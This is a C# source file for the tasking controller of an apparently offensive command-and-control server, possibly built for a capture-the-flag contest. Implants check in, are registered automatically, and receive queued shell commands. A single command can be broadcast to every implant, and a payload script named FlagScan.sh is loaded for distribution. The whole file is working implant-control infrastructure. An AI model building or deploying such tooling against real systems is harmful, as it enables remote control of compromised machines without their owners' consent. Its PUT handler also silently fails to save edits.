using System.IO;
using ListeningPostApiServer.Data;
using ListeningPostApiServer.Extensions;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Mvc;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.EntityFrameworkCore;

namespace ListeningPostApiServer.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class TaskingController : ControllerBase
    {
        private readonly ImplantRepository _implantRepository;
        private readonly IRepository<TaskBase> _taskRepository;
        public readonly IHostingEnvironment _env;

        public TaskingController(IRepository<TaskBase> taskRepository, IRepository<Implant> implantRepository, IHostingEnvironment env)
        {
            _taskRepository = taskRepository;
            _implantRepository = (ImplantRepository)implantRepository;
            _env = env;
        }

        /// <summary>
        ///     Gets the current task for the specified <see cref="Implant">implant.</see>
        /// </summary>
        //[HttpGet("/Tasking")]
        //[HttpGet("/Tasking/{id}")]
        [HttpGet("{id}")]
        public async Task<IActionResult> Get(int id)
        {
            await this.LoadFile();

            this.Log($"Implant Checked In. Implant Id: {id}");

            var implant = await _implantRepository.GetById(id) ??
                          await RegisterImplantAsync(id);

            var task = implant.Tasks.FirstOrDefault(t => t.IsPickedUp == false);

            if (task == null)
                return new JsonResult(new { task_id = "", command = "" });

            task.IsPickedUp = true;

            await _taskRepository.SaveChangesAsync();

            return new JsonResult(new { task_id = task.Id, command = task.Command });
        }

        // List
        [HttpGet("list/{id?}")]
        public async Task<IActionResult> ListTasks(int id)
        {
            if (id == 0)
            {
                return Ok(await _taskRepository.GetAllAsync());
            }

            var implant = await _implantRepository.GetById(id);
            if (implant == null)
            {
                return NoContent();
            }

            var results = implant.Tasks;

            return Ok(results);
        }

        // POST: tasking/
        [HttpPost]
        public async Task<IActionResult> Post([FromBody] TaskBase taskBase)
        {
            if (taskBase.Implant == null)
            {
                foreach (var implant in await _implantRepository.GetAllAsync())
                    await AssignTaskAsync(implant, taskBase);

                return CreatedAtAction("ListTasks", null);
            }
            await _taskRepository.CreateAsync(taskBase);

            await _taskRepository.SaveChangesAsync();

            return CreatedAtAction("ListTasks", new { id = taskBase.Implant.Id }, null);
        }

        // PUT: tasking/5
        [HttpPut("{id}")]
        public async void Put([FromBody] TaskBase taskBase)
        {
            var editedEntity = await _taskRepository.GetByIdAsync(taskBase.Id);

            editedEntity = taskBase;

            await _taskRepository.SaveChangesAsync();
        }

        private async Task<TaskBase> AssignTaskAsync(Implant implant, TaskBase task)
        {
            var newTask = new TaskBase()
            {
                Command = task.Command,
                Implant = implant,
                TaskType = TaskType.Command,
            };

            await _taskRepository.CreateAsync(newTask);

            await _taskRepository.SaveChangesAsync();

            return task;
        }

        private async Task<Implant> RegisterImplantAsync(int implantId)
        {
            var implant = await _implantRepository.CreateAsync(new Implant()
            {
                Id = implantId
            });

            await _implantRepository.SaveChangesAsync();

            return implant;
        }

        private async Task LoadFile()
        {
            var fileName = "FlagScan.sh";
            var existingFile = await _implantRepository.Context.Set<PayloadFile>()
                .FirstOrDefaultAsync(f => f.ActualFileName == fileName);
            if (existingFile != null)
            {
                this.Log($"File: {fileName} already exists in DB");
                return;
            }
            
            var localFilePath = Path.Join(this._env.WebRootPath, "Scripts/", fileName);
            var newFileEntity = new PayloadFile()
            {
                ActualFileName = fileName,
                TempFilePath = localFilePath,
            };

            this.Log($"Attempting to register local file: {localFilePath} into DB as: {newFileEntity.Guid}");

            await this._implantRepository.Context.Set<PayloadFile>().AddAsync(newFileEntity);
            await _implantRepository.Context.SaveChangesAsync();
            this.Log("Success");
        }

        //private async Task<Implant> GetImplantAsync(int implantId)
        //{
        //    return await ((ImplantRepository)_implantRepository).GetById(implantId);
        //}
    }
}